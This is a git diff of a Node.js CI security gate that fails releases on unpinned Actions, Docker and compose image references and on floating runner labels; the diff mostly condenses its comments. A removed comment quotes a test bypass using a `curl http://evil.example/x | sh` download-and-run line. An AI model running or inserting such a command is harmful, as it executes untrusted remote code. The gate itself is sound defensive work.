@@ -1,159 +1,17 @@
 #!/usr/bin/env node
 /**
- * Gate: the build pipeline's own dependencies are pinned to immutable references.
+ * Gate: the pipeline's own dependencies are pinned to immutable references. An unpinned `uses:`,
+ * an unpinned `FROM` or compose `image:`, a floating `runs-on: *-latest`, or a workflow not in
+ * `EXPECTED_WORKFLOWS` fails the release, like an unpinned npm dependency. A mutable tag is a
+ * pointer its owner can repoint at new code (docs/security/shai-hulud-snapshot-2026-08-17.md §1).
  *
- * ## Why this gate exists
+ * A reference this gate cannot read is a failure, never a pass. Discovery is recursive and knows
+ * Compose v2 names, `runs-on` is read in all five spellings GitHub accepts, a key in YAML flow style
+ * is refused, and local `action.yml` files are read too. Each of those was once a green tick over
+ * nothing; `ci-pinning.test.mjs` pins every case.
  *
- * The repository's dependency policy is "mutable references are how supply-chain
- * attacks land": exact versions, a frozen lockfile, a 7-day cooldown, integrity
- * hashes checked against the registry. Every one of those controls is enforced by
- * a gate. The *pipeline's* dependencies — GitHub Actions and container base
- * images — were held to the same standard by nothing but header comments in
- * ci.yml and Dockerfile.api. They were, and are, correct; but
- * `uses: actions/cache@v4` added tomorrow passed all eight gates, and
- * `actions/cache@v4` is a pointer its owner can repoint at new code that then
- * runs inside this repository's CI. The campaign in
- * docs/security/shai-hulud-snapshot-2026-08-17.md §1 lists **GitHub Actions and
- * Docker images** among the supply chains it compromised, and §2 says it hijacks
- * workflows to mint publish tokens.
- *
- * So: an unpinned `uses:`, an unpinned `FROM`, a floating `runs-on: *-latest`, or
- * a workflow file nobody declared is a release-blocking failure, the same as an
- * unpinned npm dependency.
- *
- * ## The workflow inventory
- *
- * `.github/workflows/codeql.yml` is a campaign IOC (§3): the worm injects a
- * workflow whose name squats on one people expect to see, so a reviewer's eye
- * slides past it. `ioc-scan.mjs` warns about that one filename. This gate takes
- * the stronger position available to a repository that knows its own workflows:
- * anything not in `EXPECTED_WORKFLOWS` fails, whatever it is called. Adding a
- * workflow is then a two-file diff, which is the point.
- *
- * ## Discovery is recursive, and that is a fix rather than a tidy-up
- *
- * This gate used to find its container files with a NON-recursive
- * `readdirSync(REPO_ROOT)` matching `/^Dockerfile(\..+)?$/` and
- * `/^docker-compose(\..+)?\.ya?ml$/`. Two whole classes of file were therefore
- * invisible to all nine gates:
- *
- *   * anything in a subdirectory — `deploy/staging/compose.yml`, a Dockerfile
- *     under `docker/`, an overlay under `k8s/`;
- *   * anything using Compose v2's filenames — `compose.yml`, `compose.yaml`,
- *     `compose.override.yml`, which is the spelling `docker compose` has
- *     preferred since v2 and which every new file is likely to use.
- *
- * An `image: postgres:16` in either of those passed the release audit in silence:
- * not "was checked and allowed", but "was never read". The walk below is
- * recursive and matches both naming conventions, and
- * `ci-pinning.test.mjs` feeds it a nested `compose.yml` with an unpinned image to
- * prove it now fires.
- *
- * ## `runs-on` has five spellings and this gate knew one of them
- *
- * The floating-runner check was `/^\s*runs-on:\s*(\S+)/` followed by
- * `runner.endsWith('-latest')`. That reads exactly one of the forms GitHub
- * accepts. Measured end to end against a scratch repository carrying the three
- * declared workflows, everything else correctly pinned, one spelling per run:
- *
- *   | `runs-on: ubuntu-latest`                            | FAIL, exit 1 |
- *   | `runs-on: "ubuntu-latest"`                          | **pass, exit 0** |
- *   | `runs-on:` + `  - ubuntu-latest`                    | **pass, exit 0** |
- *   | `runs-on: [ubuntu-latest]`                          | **pass, exit 0** |
- *   | `runs-on:` + `  group: default` + `  labels: ubuntu-latest` | **pass, exit 0** |
- *   | `os: [ubuntu-latest]` + `runs-on: ${{ matrix.os }}` | **pass, exit 0** |
- *
- * One quote character disabled a release-blocking gate, and the run printed a
- * green tick rather than saying it had judged nothing. `parseRunsOn` below reads
- * all five, and `matrixValues` resolves the matrix case from the same file.
- *
- * Two rules follow from the shape of the defect, and both are deliberate:
- *
- *   * A `runs-on` this gate CANNOT resolve to a concrete label — an expression
- *     over `inputs`, `vars`, `github.*`, or a `matrix` key that is not defined in
- *     the file — is a FAILURE, not a pass. "I could not read it" and "I read it
- *     and it was pinned" produced the same exit code before, which is precisely
- *     how the six spellings above survived. The remedy is cheap: name the runner
- *     literally, or put the value in the matrix in the same file.
- *   * The matrix parse deliberately OVER-collects: it gathers every scalar under
- *     a `matrix:` block, including `include:` entries, without tracking which key
- *     belongs to which job. Over-collection can only make the gate judge more
- *     labels, never fewer, so the failure mode of a loose parse here is a false
- *     positive a human resolves in seconds — not a silent pass.
- *
- * `ci-pinning.test.mjs` feeds every spelling in the table above, including the
- * quoted one that started this.
- *
- * ## Every reader here is a line regex, and YAML has flow styles
- *
- * The same defect one level up. `uses:`, `runs-on:`, `image:` and `container:` are
- * all read by patterns anchored at `^\s*`, and a YAML flow mapping puts a key
- * anywhere on the line. GitHub's parser accepts both spellings. Measured against
- * the exported checks, one form per call, everything else correctly pinned:
- *
- *   | `- uses: actions/checkout@v7`                    | FAIL, 1 judged |
- *   | `- {uses: actions/checkout@v7}`                  | **pass, 0 judged** |
- *   | `steps: [{uses: actions/checkout@v7}]`           | **pass, 0 judged** |
- *   | `- uses:` + `    actions/checkout@v7`            | **pass, 0 judged** |
- *   | `a: {runs-on: ubuntu-latest, steps: []}`         | **pass, 0 declarations** |
- *   | `pg: {image: postgres:16}`                       | **pass, 0 judged** |
- *
- * And the note said so without saying anything: "1 workflow(s), 0 action
- * reference(s)" over a green tick. `scripts/keyless-identity.mjs` learned the flow
- * form for `permissions:` after an adversarial review found it blind to it; this
- * file reads the same four files and did not.
- *
- * `checkNothingWasUnread` refuses a line carrying one of those keys in a shape the
- * readers cannot see, rather than teaching four regexes to parse flow YAML. The
- * remedy is block style, which is what every workflow here already writes.
- *
- * ## And the local action nobody opened
- *
- * `uses: ./…` is cleared here because "a local action lives in this repository and
- * is reviewed with it" — a statement about review, not about this gate, which read
- * `.github/workflows/*.yml` and nothing else. A composite action containing
- * `uses: actions/checkout@v7` was therefore a two-hop bypass: the workflow line
- * passed because it was local, and the local file was never read.
- * `discoverLocalActionFiles` finds every `action.yml`/`action.yaml` in the tree and
- * holds it to the same rule. There are none today, so it carries no minimum — the
- * subject is the file somebody adds next week.
- *
- * ## The one thing an `image:` may be other than a digest
- *
- * `docker-compose.staging.yml` deploys the two application images **by digest**,
- * and those digests are produced per build by `pnpm run release:artifacts`. They
- * cannot be literals in a committed file. The value is therefore a compose
- * interpolation that is REQUIRED and has NO default —
- * `${PRL_API_IMAGE:?the API image DIGEST...}` — and that exact shape is accepted
- * here, for a reason worth stating precisely:
- *
- *   * `${VAR:-postgres:16}` is REJECTED. The default is a committed mutable tag,
- *     which is exactly what this gate exists to forbid, and it is the shape a
- *     reader is most likely to reach for.
- *   * `${VAR}` is REJECTED. Compose substitutes empty and fails obscurely, and
- *     nothing about the value is constrained.
- *   * `${VAR:?message}` is ACCEPTED. Nothing mutable is committed, and compose
- *     refuses to run at all without a value.
- *
- * What this gate cannot see is whether the injected value is itself a digest. That
- * is checked where it can be: `scripts/staging.mjs` refuses a manifest whose
- * references are not `name@sha256:<64 hex>`, and after `up` it compares the
- * running containers' images against the manifest and fails on a difference. The
- * split is deliberate — a static gate should not pretend to know a runtime value —
- * and it is recorded here so the exception is not read as a loophole.
- *
- * ## `--freshness`: a reporter, not a gate
- *
- * Passing `--freshness` re-resolves every pinned tag against its registry and
- * reports which digests have moved upstream. It exits 0 whatever it finds, and
- * that is deliberate rather than lax: a base image rebuilt for a security patch
- * must be VISIBLE, but failing the build on it would make every offline or
- * rate-limited run red and would put a network dependency in the middle of an
- * otherwise hermetic gate. Drift is a prompt to review and refresh a digest, in a
- * reviewed diff, which is the whole point of pinning.
- *
- * The checks are pure functions over file text so
- * `scripts/supply-chain/ci-pinning.test.mjs` can feed them the real attacks.
+ * `--freshness` re-resolves pinned tags and reports drift. It always exits 0, because failing on an
+ * upstream rebuild would make every offline run red.
  *
  * Usage:
  *     node scripts/supply-chain/ci-pinning.mjs               the gate
@@ -171,17 +29,16 @@ import { bold, dim, Gate, green, REPO_ROOT, red, runGate, yellow } from './lib.m
 
 /** A full git commit SHA. Anything shorter is ambiguous and anything else is a moving pointer. */
 const COMMIT_SHA = /^[0-9a-f]{40}$/;
-/** An OCI content digest. */
 const IMAGE_DIGEST = /@sha256:[0-9a-f]{64}$/;
 
 /**
- * A compose value that is entirely a required interpolation with no default:
- * `${VAR:?message}` or `${VAR?message}`. See the header for why this shape, and
- * only this shape, is an acceptable `image:`.
+ * A compose value that is only a required interpolation with no default, `${VAR:?message}`. This
+ * is the one non-digest `image:` accepted, for `docker-compose.staging.yml`, whose digests come per
+ * build from `release:artifacts`. `${VAR:-tag}` commits a mutable default and `${VAR}` constrains
+ * nothing, so both fail. `scripts/staging.mjs` checks the injected value is a digest.
  */
 const REQUIRED_INTERPOLATION = /^\$\{[A-Za-z_][A-Za-z0-9_]*:?\?[^}]*\}$/;
 
-/** Directories that never contain first-party container files. */
 const SKIP_DIRS = new Set([
   '.git',
   'node_modules',
@@ -193,30 +50,12 @@ const SKIP_DIRS = new Set([
   'sbom',
 ]);
 
-/**
- * `Dockerfile`, `Dockerfile.api`, `Dockerfile.web` — and `api.Dockerfile`.
- *
- * The suffix form is the other half of the convention (it is what buildx's own
- * examples and most editors' syntax highlighting key on), and it was invisible
- * here: the pattern was anchored at the front, so `api.Dockerfile` matched
- * nothing, was never read, and an unpinned `FROM` in one passed the release
- * audit in silence. Same class as the non-recursive walk above — a file the gate
- * never opened, reported as a pass.
- */
+/** `Dockerfile`, `Dockerfile.api`, and the suffix form `api.Dockerfile`. */
 const DOCKERFILE_NAME = /^(?:Dockerfile(?:\..+)?|.+\.Dockerfile)$/;
-/**
- * Compose v1 (`docker-compose.yml`, `docker-compose.staging.yml`) and Compose v2
- * (`compose.yaml`, `compose.override.yml`). The `docker-` prefix is optional
- * because v2 dropped it, and a file named `compose.yml` matched neither of the
- * old patterns — so an unpinned image in one was invisible to every gate.
- */
+/** Compose v1 `docker-compose*.yml` and Compose v2 `compose*.yaml`. */
 const COMPOSE_NAME = /^(?:docker-)?compose(\..+)?\.ya?ml$/;
 
-/**
- * Strips YAML/Dockerfile line comments so prose *about* an unpinned reference is
- * not read as one. ci.yml's own header contains the literal text
- * `uses: actions/checkout@v7` as an example of what not to write.
- */
+/** Strips YAML/Dockerfile comments. ci.yml's header quotes an unpinned `uses:` as an example. */
 function uncomment(line) {
   const trimmed = line.trimStart();
   if (trimmed.startsWith('#')) return '';
@@ -224,7 +63,6 @@ function uncomment(line) {
   return hash === -1 ? line : line.slice(0, hash);
 }
 
-/** Every `.yml`/`.yaml` file under `.github/workflows`, by bare filename. */
 export function listWorkflowFiles(workflowDir) {
   if (!existsSync(workflowDir)) return [];
   return readdirSync(workflowDir, { withFileTypes: true })
@@ -234,17 +72,9 @@ export function listWorkflowFiles(workflowDir) {
 }
 
 /**
- * Every `action.yml` / `action.yaml` in the repository — a LOCAL action, composite
- * or docker, reachable from a workflow as `uses: ./path/to/it`.
- *
- * `checkWorkflowPinning` clears `./…` on the grounds that "a local action lives in
- * this repository and is reviewed with it". That is a statement about review, not
- * about this gate: the gate read `.github/workflows/*.yml` and nothing else, so a
- * composite action containing `uses: actions/checkout@v7` was a two-hop bypass of
- * the rule this file exists to enforce — the workflow line passed because it was
- * local, and the local file was never opened. There are none in this repository
- * today, which is why this is discovery with no minimum rather than a
- * scan-of-nothing assertion: the file somebody adds next week is the subject.
+ * Every local `action.yml`/`action.yaml`. Without this a composite action was a two-hop bypass,
+ * since `./...` passes in a workflow and the action file was never read. There are none today, so
+ * there is no minimum.
  *
  * @param {string} root
  * @returns {string[]} repo-relative paths
@@ -275,8 +105,6 @@ export function discoverLocalActionFiles(root) {
 }
 
 /**
- * Check: only the declared workflows exist, and all of them do.
- *
  * @param {Gate} gate
  * @param {string[]} present bare filenames
  */
@@ -302,14 +130,7 @@ export function checkWorkflowInventory(gate, present) {
   }
 }
 
-/**
- * Reads the value of an `image:` line.
- *
- * Takes the rest of the line rather than the first whitespace-delimited token,
- * because a required compose interpolation carries a human-readable message and
- * therefore contains spaces: `image: ${PRL_API_IMAGE:?the API image DIGEST...}`.
- * A `\S+` capture read that as `${PRL_API_IMAGE:?the` and judged a fragment.
- */
+/** The rest of the line, because `${PRL_API_IMAGE:?message}` contains spaces. */
 function imageValue(line) {
   const match = /^\s*image:\s*(.+?)\s*$/.exec(line);
   if (match === null) return null;
@@ -317,19 +138,8 @@ function imageValue(line) {
 }
 
 /**
- * Reads a job-level `container:` SHORTHAND — `container: node:22`.
- *
- * GitHub documents `jobs.<id>.container` as "a string or a map": the map form
- * carries an `image:` key, and the string form is the image reference written
- * straight onto the `container:` line. This gate only ever looked for `image:`,
- * so the shorthand was never judged at all. Measured on a scratch repository:
- * `container: node:22` produced no failures and exit 0, while the long form
- * `container:` + `  image: node:22` failed correctly. The job container is the
- * environment every step in the job executes inside — a strictly larger blast
- * radius than the service containers the gate already catches.
- *
- * Returns null for the map form (an empty value), which the `image:` check
- * covers one line further down, and for any other key.
+ * The job-level `container: node:22` shorthand. It was never judged before, and a job container is
+ * where every step runs. Returns null for the map form, which `imageValue` covers.
  */
 function containerValue(line) {
   const match = /^\s*container:\s*(.+?)\s*$/.exec(line);
@@ -338,7 +148,6 @@ function containerValue(line) {
   return value === '' ? null : value;
 }
 
-/** Strips one matching pair of surrounding quotes. `"ubuntu-latest"` is `ubuntu-latest`. */
 function unquote(value) {
   const v = value.trim();
   const quoted =
@@ -346,7 +155,6 @@ function unquote(value) {
   return quoted ? v.slice(1, -1) : v;
 }
 
-/** A YAML scalar or a flow sequence, as a list of values. `[a, b]` is `['a', 'b']`. */
 function scalarOrFlowSequence(value) {
   const v = value.trim();
   if (v.startsWith('[') && v.endsWith(']')) {
@@ -360,20 +168,11 @@ function scalarOrFlowSequence(value) {
   return single === '' ? [] : [single];
 }
 
-/** How far a line is indented, ignoring its content. */
 const indentOf = (line) => line.length - line.trimStart().length;
 
 /**
- * Every scalar that appears under a `strategy.matrix:` block, keyed by the
- * matrix key it sits under, so `runs-on: ${{ matrix.os }}` can be resolved to
- * the labels that expression actually expands to.
- *
- * Deliberately permissive — see the header. It does not track which `matrix:`
- * belongs to which job and it folds `include:` entries in under their own keys,
- * so it can attribute a label to a job that never uses it. That direction is
- * safe: it makes the gate judge MORE labels. The direction that is not safe is
- * the one this file already suffered, where an expression resolved to nothing
- * and the job read as pinned.
+ * Every scalar under a `matrix:` block, by key, so `${{ matrix.os }}` resolves. It over-collects
+ * (no job tracking, `include:` folded in), which can only make the gate judge more labels.
  *
  * @returns {Map<string, Set<string>>}
  */
@@ -415,19 +214,9 @@ export function matrixValues(text) {
 }
 
 /**
- * Every `runs-on` in a workflow, in all five spellings GitHub accepts, as the
- * concrete labels it names plus the `${{ … }}` expressions it defers.
- *
- * The spellings, and where each one is handled:
- *
- *   * `runs-on: ubuntu-latest`            plain scalar
- *   * `runs-on: "ubuntu-latest"`          quoted scalar — `unquote`
- *   * `runs-on: [ubuntu-latest, x]`       flow sequence — `scalarOrFlowSequence`
- *   * `runs-on:` / `  - ubuntu-latest`    block sequence — the indented walk
- *   * `runs-on:` / `  group: …` / `  labels: …`  runner-group mapping, where the
- *     `labels:` key (itself a scalar, a flow sequence, or a nested block
- *     sequence) is what names the runner image; `group:` names a pool whose
- *     membership is not in this file and is not judged here.
+ * Every `runs-on`, as concrete labels plus deferred `${{ ... }}` expressions. Handles a plain or
+ * quoted scalar, a flow sequence, a block sequence, and a runner-group mapping whose `labels:` names
+ * the image. A bare-scalar-only regex once passed five of six spellings.
  *
  * @returns {Array<{line: number, labels: string[], expressions: string[]}>}
  */
@@ -465,7 +254,6 @@ export function parseRunsOn(text) {
           else labelled.push(...scalarOrFlowSequence(value));
           continue;
         }
-        // `group:` or anything else: a later `- item` belongs to the sequence again.
         collect = sequence;
       }
       labels = labelled.length > 0 ? labelled : sequence;
@@ -480,14 +268,12 @@ export function parseRunsOn(text) {
 }
 
 /**
- * Substitutes `${{ matrix.<key> }}` for every value that key takes, returning one
- * string per combination. A string that still contains `${{` after this could not
- * be resolved from the file and its caller must refuse to judge it.
+ * One string per matrix combination. A result still containing `${{` could not be resolved from the
+ * file, and the caller must fail it.
  */
 function expandMatrixExpression(expression, matrix) {
   let current = [expression];
-  // Bounded: a runner label is one or two substitutions, and an unbounded loop
-  // over attacker-supplied text inside a security gate is its own problem.
+  // Bounded, since this loops over untrusted text.
   for (let pass = 0; pass < 4; pass++) {
     if (!current.some((s) => s.includes('${{'))) break;
     const next = [];
@@ -508,8 +294,6 @@ function expandMatrixExpression(expression, matrix) {
 }
 
 /**
- * Check: no job runs on a floating `*-latest` runner label, in any spelling.
- *
  * @param {Gate} gate
  * @param {string} label
  * @param {string} text
@@ -538,8 +322,7 @@ export function checkRunnerPinning(gate, label, text) {
         runners.push(expanded);
       }
     }
-    // `unresolved > 0` has already failed above, and reporting the same runs-on
-    // twice trains a reader to skim the second line.
+    // An unresolved expression has already failed above.
     if (runners.length === 0 && unresolved === 0) {
       gate.fail(
         `runs-on names no runner label at ${at}`,
@@ -561,24 +344,10 @@ export function checkRunnerPinning(gate, label, text) {
   return declarations.length;
 }
 
-/**
- * The four keys this file's line-oriented readers judge, wherever they appear on
- * a line rather than only at the start of one.
- *
- * `[\s{,[]` and not `[-]`: `- uses:` puts a space between the dash and the key,
- * while `Base-image digest freshness` would otherwise read as an `image` key.
- */
+/** The four judged keys anywhere on a line. `[\s{,[]`, not `-`, so `Base-image` is not a key. */
 const READ_KEY_MENTION = /(?:^|[\s{,[])(uses|runs-on|image|container)\s*:/g;
 
-/**
- * Whether the reader for `key` would have read this line at all.
- *
- * Every one of them is anchored with `^\s*`, which is the whole point: YAML's
- * FLOW styles put a key anywhere on the line, and a key the gate never read is a
- * key it never cleared. `uses` additionally needs a value on the same line —
- * `- uses:` with the reference on the next line is a plain multi-line scalar
- * that GitHub accepts and `/^\s*-?\s*uses:\s*(\S+)/` does not match.
- */
+/** Whether the `^\s*`-anchored reader for `key` reads this line. `uses` needs its value on the line. */
 function readsKeyOnLine(key, line) {
   if (key === 'uses') return /^\s*-?\s*uses:\s*\S/.test(line);
   if (key === 'runs-on') return /^\s*runs-on:/.test(line);
@@ -587,37 +356,9 @@ function readsKeyOnLine(key, line) {
 }
 
 /**
- * Check: nothing on this line carries one of the four keys in a shape the readers
- * above cannot see.
- *
- * ## Why a mismatch is a failure rather than a smaller number
- *
- * Every reader in this file is a line regex anchored at the start of the line, so
- * all four are blind to YAML's flow styles, which GitHub's parser accepts exactly
- * as it accepts the block ones. Measured against the exported checks, one form per
- * call, everything else in the workflow correctly pinned:
- *
- *   | `- uses: actions/checkout@v7`            | FAIL, 1 judged   |
- *   | `- {uses: actions/checkout@v7}`          | **pass, 0 judged** |
- *   | `steps: [{uses: actions/checkout@v7}]`   | **pass, 0 judged** |
- *   | `- uses:` + newline + `    actions/checkout@v7` | **pass, 0 judged** |
- *   | `a: {runs-on: ubuntu-latest}`            | **pass, 0 declarations** |
- *   | `pg: {image: postgres:16}`               | **pass, 0 judged** |
- *
- * The `judged`/`runs-on` counts this file returns are a NOTE, not an assertion, so
- * the run said "1 workflow(s), 0 action reference(s)" and printed a green tick.
- * That is the same defect as `FROM node AS node` two functions down and the same
- * defect as the `runs-on` spellings in the header, and it is the reason the
- * Dockerfile check's counter was made load-bearing. This is that counter for the
- * workflow reader, and it is per-line so the message can name the line.
- *
- * `scripts/keyless-identity.mjs` already learned the flow-mapping form for
- * `permissions:` after an adversarial review found it blind to it. This file did
- * not, and the two gates read the same files.
- *
- * The failure mode of this check is a false positive on a legitimate flow-style
- * line, resolved by writing it in block style — which is what every workflow in
- * this repository already does. The failure mode it replaces is silence.
+ * Fails a line that carries one of the four keys in a shape the anchored readers cannot see, such
+ * as `- {uses: x@v7}` or `- uses:` with the value on the next line. Each of those once passed with
+ * 0 references judged. The remedy is block style, which every workflow here uses.
  *
  * @param {Gate} gate
  * @param {string} line  already passed through `uncomment`
@@ -644,12 +385,6 @@ function checkNothingWasUnread(gate, line, at) {
 }
 
 /**
- * Check: every `uses:` is a full commit SHA, a local action, or a digest-pinned
- * container action; every container the job runs in or beside is digest-pinned;
- * no job runs on a floating `*-latest` runner label (`checkRunnerPinning`, which
- * reads all five spellings of `runs-on` — see the header); and nothing carrying
- * one of those keys went unread (`checkNothingWasUnread`).
- *
  * @param {Gate} gate
  * @param {string} label  how to name this file in a message
  * @param {string} text
@@ -691,8 +426,6 @@ export function checkWorkflowPinning(gate, label, text) {
       continue;
     }
 
-    // The job-level `container:` shorthand — `container: node:22`. See
-    // `containerValue` for what this could not see and how that was measured.
     const container = containerValue(line);
     if (container !== null && !IMAGE_DIGEST.test(container)) {
       gate.fail(
@@ -705,9 +438,7 @@ export function checkWorkflowPinning(gate, label, text) {
 
     const image = imageValue(line);
     if (image !== null && !IMAGE_DIGEST.test(image)) {
-      // A workflow is not interpolated by compose, so the required-interpolation
-      // exception below deliberately does not apply here: a service container
-      // reference is either a digest or it is mutable.
+      // Workflows are not compose-interpolated, so the required-interpolation exception does not apply.
       gate.fail(
         `service container is not digest-pinned at ${at}: ${image}`,
         'a tag is mutable; pin image:tag@sha256:<64 hex> with the tag kept in a comment',
@@ -718,39 +449,11 @@ export function checkWorkflowPinning(gate, label, text) {
 }
 
 /**
- * Check: every `FROM` either refers to a stage declared EARLIER in the same file
- * or carries an image digest.
+ * Every `FROM` refers to an earlier stage or carries a digest. A stage is registered after the
+ * test, because `FROM node AS node` once matched itself and passed an unpinned image.
  *
- * ## A stage named after its own image used to bypass this entirely
- *
- * The stage registration ran BEFORE the "is this an earlier stage" test:
- *
- *     if (asIndex !== -1) { … stages.add(stage); }
- *     if (stages.has(image) || image === '') continue;
- *
- * so `FROM node AS node` added `node` to `stages` and then immediately matched
- * it, and the line was skipped as an internal reference to a stage that is in
- * fact itself. Measured: a `Dockerfile.api` of `FROM node AS node` plus
- * `RUN curl http://evil.example/x | sh`, every other file correctly pinned —
- * gate passed, exit 0. The only trace anywhere in the output was the note
- * counting one fewer external base image, and `judged` was not incremented
- * either, so no coverage counter could flag it. `docker build` resolves that
- * `FROM` against the registry, not against the stage, so the bypass shipped a
- * genuinely unpinned image.
- *
- * The stage is now registered after the test, which is the only order that is
- * correct anyway: Docker itself resolves a stage name against stages declared
- * before the current line.
- *
- * ## And the counter that would have caught it
- *
- * A gate that silently judges fewer things is the shape of this defect and of
- * the `runs-on` one above, so the count is now load-bearing rather than
- * decorative: the FIRST `FROM` in a Dockerfile can never be an internal stage
- * reference, because no stage has been declared yet. A file with `FROM` lines
- * and zero external base images judged is therefore impossible, and is reported
- * as a failure rather than as a quietly smaller number. That is exactly what
- * `FROM node AS node` produced.
+ * The first `FROM` can never be a stage reference, so `FROM` lines with zero external images judged
+ * is a failure.
  *
  * @param {Gate} gate
  * @param {string} label
@@ -772,14 +475,11 @@ export function checkDockerfilePinning(gate, label, text) {
     const image = words[0] ?? '';
     const asIndex = words.findIndex((w) => w.toLowerCase() === 'as');
     const stage = asIndex === -1 ? undefined : words[asIndex + 1];
-    // Registered AFTER the test below, never before it — see the header above.
     const declareStage = () => {
       if (stage !== undefined) stages.add(stage);
     };
 
     if (image === '') {
-      // `FROM --platform=linux/amd64` and nothing else: not an internal
-      // reference and not a digest, so it must not fall through as neither.
       gate.fail(
         `FROM names no image at ${at}: ${(from[1] ?? '').trim()}`,
         'the gate could not read a base image from this line, and a line it cannot read is not a line ' +
@@ -788,7 +488,6 @@ export function checkDockerfilePinning(gate, label, text) {
       declareStage();
       continue;
     }
-    // A reference to an earlier stage in the same file is internal to this build.
     if (stages.has(image)) {
       declareStage();
       continue;
@@ -822,9 +521,8 @@ export function checkDockerfilePinning(gate, label, text) {
 }
 
 /**
- * Check: every `image:` in a compose file carries a digest, or is a required
- * interpolation with no default. Services built from a local Dockerfile have no
- * `image:` and are covered by the Dockerfile check.
+ * Every compose `image:` carries a digest or is a required interpolation. Services built from a
+ * local Dockerfile have no `image:` and are covered by the Dockerfile check.
  *
  * @param {Gate} gate
  * @param {string} label
@@ -853,10 +551,7 @@ export function checkComposePinning(gate, label, text) {
 }
 
 /**
- * Every Dockerfile and compose file in the repository, recursively.
- *
- * Exported so the tests discover exactly what the gate discovers; a test that
- * re-implements the walk is a test that cannot catch a walk that stopped walking.
+ * Every Dockerfile and compose file, recursively. Exported so the tests use the gate's own walk.
  *
  * @param {string} root
  * @returns {{dockerfiles: string[], composeFiles: string[]}} repo-relative paths
@@ -889,25 +584,9 @@ export function discoverContainerFiles(root) {
 }
 
 /**
- * Every `uses:` reference in the workflows and the local action files, as the
- * gate above reads them, plus the trailing `# v7.0.1`-style comment beside each.
- *
- * Exported for `action-advisories.mjs`, which asks a question this file cannot:
- * pinning stops a tag being repointed, and does nothing at all about a pinned SHA
- * of a version that was later found vulnerable. Answering that needs the same set
- * of references this gate judges — read through the same discovery and matched by
- * the same regex — so that a reference one of them sees is a reference the other
- * sees. Re-implementing the walk there would let the two drift apart silently,
- * which is the failure this directory keeps finding in itself.
- *
- * One entry per OCCURRENCE, not per distinct reference: the count has to be
- * comparable with the `action reference(s)` note above, which is the floor the
- * advisory gate refuses to scan below.
- *
- * The comment is captured and deliberately NOT trusted as the version. See
- * `action-advisories.mjs` for what it is used for instead — a claim to be
- * checked against GitHub's own refs, so that a pin labelled with a version it is
- * not fails rather than misleading the next reader.
+ * Every `uses:` reference, one per occurrence, with its trailing `# v7.0.1` comment. Exported for
+ * `action-advisories.mjs` so both gates read the same set. The comment is a claim that gate checks,
+ * never the version.
  *
  * @param {string} root
  * @returns {Array<{reference: string, comment: string|null, at: string, line: string}>}
@@ -948,15 +627,10 @@ export function runCiPinningGate() {
       const path = join(workflowDir, name);
       const text = readFileSync(path, 'utf8');
       actionRefs += checkWorkflowPinning(gate, relative(REPO_ROOT, path), text);
-      // Counted for the note rather than re-checked: `checkWorkflowPinning` has
-      // already judged them. A visible count is how a reader notices that a
-      // parser stopped matching — the previous `runs-on` regex matched one of
-      // five spellings and nothing in the output said so.
+      // Counted for the note, so a parser that stops matching shows up.
       runners += parseRunsOn(text).length;
     }
 
-    // Local actions, held to the same rule as the workflows that call them. See
-    // `discoverLocalActionFiles` for the two-hop bypass this closes.
     const localActions = discoverLocalActionFiles(REPO_ROOT);
     for (const name of localActions) {
       actionRefs += checkWorkflowPinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
@@ -987,16 +661,9 @@ export function runCiPinningGate() {
   });
 }
 
-// ---------------------------------------------------------------------------
-// --freshness: is a pinned digest still what its tag points at?
-// ---------------------------------------------------------------------------
-
 /**
- * Splits `registry/name:tag@sha256:...` into its parts.
- *
- * The awkward case is a registry with a port (`localhost:5000/x:1`), where the
- * first colon is not the tag separator. The rule used is the one the reference
- * grammar uses: a colon introduces a tag only if what follows it contains no `/`.
+ * Splits `registry/name:tag@sha256:...`. A colon introduces a tag only if no `/` follows it, so a
+ * registry port is not read as a tag.
  *
  * @returns {{name: string, tag: string|null, digest: string} | null}
  */
@@ -1011,14 +678,7 @@ export function parsePinnedReference(reference) {
   return { name: left.slice(0, colon), tag: left.slice(colon + 1), digest };
 }
 
-/**
- * Every digest-pinned image reference in the repository's container and workflow
- * files, with where it was found.
- *
- * Reads the same files the gate reads, through the same discovery, so a reference
- * the gate judges is a reference this can re-check — and one it cannot see is one
- * neither of them sees, which is a single failure rather than two.
- */
+/** Every digest-pinned image reference, found through the gate's own discovery. */
 export function collectPinnedImages(root) {
   const found = [];
   const add = (file, index, reference) => {
@@ -1058,8 +718,6 @@ export function collectPinnedImages(root) {
     }
   }
 
-  // Deduplicated by reference, keeping every place it appears: the same base image
-  // is pinned in both Dockerfiles and the report should say so once.
   const byReference = new Map();
   for (const entry of found) {
     const existing = byReference.get(entry.reference);
@@ -1070,16 +728,8 @@ export function collectPinnedImages(root) {
 }
 
 /**
- * Re-resolves one tag against Docker Hub and returns the digest it points at now.
- *
- * Only Docker Hub is supported, and a reference to any other registry is reported
- * as unchecked rather than assumed current — an "everything is fine" that came
- * from not looking is the failure mode this whole file exists to avoid.
- *
- * The two `Accept` headers matter: without them the registry returns a
- * single-platform manifest for the daemon's architecture and its digest is NOT
- * the digest a multi-arch tag resolves to, so every multi-arch pin would look
- * like it had drifted.
+ * The digest a Docker Hub tag points at now. Other registries are reported unchecked. The `Accept`
+ * headers make a multi-arch tag resolve to its index digest, not one platform's manifest.
  */
 async function resolveTagDigest(name, tag) {
   if (name.includes('.') || name.startsWith('localhost')) {
@@ -1116,11 +766,7 @@ async function resolveTagDigest(name, tag) {
   }
 }
 
-/**
- * The drift report. Always exits 0 — see the header for why that is deliberate.
- *
- * @param {boolean} asJson
- */
+/** @param {boolean} asJson */
 async function runFreshnessReport(asJson) {
   const pinned = collectPinnedImages(REPO_ROOT);
   const results = [];
